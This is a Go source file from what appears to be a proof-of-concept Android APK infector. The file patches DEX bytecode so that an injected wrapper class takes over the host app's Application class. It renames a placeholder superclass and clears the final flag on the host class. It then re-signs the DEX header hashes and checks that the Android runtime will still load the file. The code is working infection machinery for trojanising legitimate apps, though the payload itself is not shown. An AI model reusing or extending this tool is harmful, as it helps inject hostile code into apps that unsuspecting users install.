package dex

import (
	"bytes"
	"crypto/sha1"
	_ "embed"
	"encoding/binary"
	"fmt"
	"hash/adler32"
	"log"
	"path/filepath"
	"strings"

	"github.com/kaitai-io/kaitai_struct_go_runtime/kaitai"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
)

// pristineStub is the wrapper stub exactly as committed (placeholder superclass
// Lz/z/z;, spec-valid hashes). Patch() derives every injection from this copy,
// so the tool is repeatable and no run can corrupt the fixture on disk.
//
//go:embed testdata/stub_pristine.dex
var pristineStub []byte

const (
	// DEX structure offsets
	fileSizeOff            = 0x20
	mapOff                 = 0x34
	dataSizeOff            = 0x68
	signatureOff           = 0x20
	checksumOff            = 0xc
	stringIdsCount         = 0x3   //how many stringIds we should change
	classDataOffOff        = 0xe4  //map->class_def_item->class_data_off
	classDataItemOffOff    = 0x29c //map->class_data_item->offset
	annotationOffItemOff   = 0x2a8 //map->annotation_set_item->entries->annotation_off_item
	mapListOffOff          = 0x2b4 //map->map_list->offset
	posStringIdsChangedOff = 0x84
)

// this name is patched so we should make it
// as short as possible
// var placeholder = "La/a/a;"
var placeholder = "Lz/z/z;"
var placeholderLength = len(placeholder) + 1
var placeholderOff int
var dexPath, _ = filepath.Abs("InjectedApp.dex")
var dexPathNew, _ = filepath.Abs("InjectedApp_patched.dex")

// SHA-1 signature (hash) of the rest of the file (everything but magic, checksum, and this field); used to uniquely identify files
func patchSignature(data []byte) {

	signature := sha1.Sum(data[signatureOff:])

	log.Printf("New DEX Signature = %x\n", signature)

	// patch signature
	for i := 0; i < 20; i++ {
		data[0xc+i] = signature[i]
	}
}

// adler32 checksum of the rest of the file (everything but magic and this field); used to detect file corruption
func patchChecksum(data []byte) {
	checksum := adler32.Checksum(data[checksumOff:])

	log.Printf("New DEX Checksum = %x\n", checksum)

	// patch checksum
	binary.LittleEndian.PutUint32(data[0x8:], checksum)
}

// Yes, dex uses sleb and uleb data types not uint32
// But we use our predictable DEX so we can ignore it

// What is changed in DEX after patching parent class?
// DEX format doc: https://source.android.com/devices/tech/dalvik/dex-format
/*
	header_item->checksum
	header_item->signature
	header_item->file_size
	header_item->map_off
	header_item->data_size
	string_id_item->string_data_off
	map->class_def_item->class_data_off
	string_data_item->utf16_size
	map->class_data_item->offset
	map->annotation_set_item->entries->annotation_off_item
	map->map_list->offset

*/
// Do not forget about alignment of some structures!

// PatchAppModifierBytes clears the final modifier on the host Application class
// definition inside an in-memory dex image and re-signs it.
//
// The Application-hijack vector makes the injected wrapper subclass the host's
// own Application class, and ART refuses to subclass a final class. The APK is
// repacked straight from memory (see internal/injector.Repack), so this has to
// work on a byte slice rather than on a path.
func PatchAppModifierBytes(data []byte) ([]byte, error) {
	dexFile := NewDex()
	if err := dexFile.Read(kaitai.NewStream(bytes.NewReader(data)), nil, dexFile); err != nil {
		return nil, err
	}
	classDefs, err := dexFile.ClassDefs()
	if err != nil {
		return nil, err
	}
	for i, classDefItem := range classDefs {
		typeName, _ := classDefItem.TypeName()
		if typeName != utils.OldAppNameNormalized {
			continue
		}
		classDefOffset := dexFile.Header.ClassDefsOff + uint32(i*32) // 32 = sizeof(ClassDefItem)
		if int(classDefOffset)+8 > len(data) {
			return nil, fmt.Errorf("class_def offset 0x%x is out of the dex image", classDefOffset)
		}
		binary.LittleEndian.PutUint32(data[classDefOffset+4:], uint32(Dex_ClassAccessFlags__Public))
		patchSignature(data)
		patchChecksum(data)
		log.Printf("Patch final to public in Application class %s \n", typeName)
	}
	return data, nil
}

// StubPath returns the dex file the Application-hijack vector rewrites in
// place (the stub that ships as classes2.dex).
func StubPath() string { return dexPath }

// placeholderDescriptor is the stub class the injected wrapper extends. Patch
// rewrites it to the host Application class descriptor.
const placeholderDescriptor = "Lz/z/z;"

// RenameDescriptor rewrites a type descriptor everywhere it appears in the
// string table. Encode() re-derives the canonical string_ids/type_ids order and
// every offset from the model, so this model edit is the whole rename — it
// replaces the old byte-offset surgery, which only worked for one hard-coded
// fixture layout and silently produced a broken dex on any deviation.
func RenameDescriptor(f *DexFile, from, to string) (int, error) {
	n := 0
	for i, s := range f.Strings {
		if s == from {
			f.Strings[i] = to
			n++
		}
	}
	if n == 0 {
		return 0, fmt.Errorf("dex: descriptor %q not found in the string table", from)
	}
	return n, nil
}

// Patch renames the stub's placeholder superclass to the host Application class
// and writes the result to dexPathNew (InjectedApp_patched.dex), which the
// injector then seals as classesN.dex.
//
// The source is the embedded pristine stub, never the on-disk fixture: writing
// the patched dex back over InjectedApp.dex made the tool single-shot — the
// next run parsed an already-renamed stub and died with
// `descriptor "Lz/z/z;" not found in the string table`.
func Patch() {
	data := pristineStub

	f, err := Parse(data)
	if err != nil {
		log.Panicf("DEX Failed to parse the embedded stub: %v", err)
	}

	// Target: the host's own Application class, or the framework one when the
	// manifest had no android:name and we added the wrapper reference (ADD).
	hostFQN := manifest.HostAppClassName()
	if hostFQN == "" {
		hostFQN = "android.app.Application"
	}
	target := "L" + strings.ReplaceAll(hostFQN, ".", "/") + ";"
	utils.OldAppNameNormalized = target

	n, err := RenameDescriptor(f, placeholderDescriptor, target)
	if err != nil {
		log.Panicf("DEX stub: %v", err)
	}

	out, err := f.Encode()
	if err != nil {
		log.Panicf("DEX Failed to emit the stub: %v", err)
	}
	utils.WriteChanges(out, dexPathNew)

	// The dex that actually ships must be loadable by ART: header hashes intact,
	// the wrapper class defined, its superclass resolved to the host Application
	// class, and the string table still sorted (ART binary-searches it). The gate
	// lives here, next to the bytes, so no caller can skip it.
	if err := Validate(dexPathNew, manifest.WrapperClassName()); err != nil {
		log.Panicf("dex patch produced an unusable stub dex (%v)", err)
	}
	if err := ValidateSuperclass(dexPathNew, manifest.WrapperClassName(), hostFQN); err != nil {
		log.Panicf("stub dex superclass mismatch (%v)", err)
	}

	log.Printf("DEX writer: %s -> %s (%d string(s) renamed, %d -> %d bytes)",
		placeholderDescriptor, target, n, len(data), len(out))
}

// PatchedStubPath returns the dex Patch() just produced — the file the injector
// seals as classesN.dex. The fixture on disk (InjectedApp.dex) stays pristine:
// it is only ever a source, never an output.
func PatchedStubPath() string { return dexPathNew }
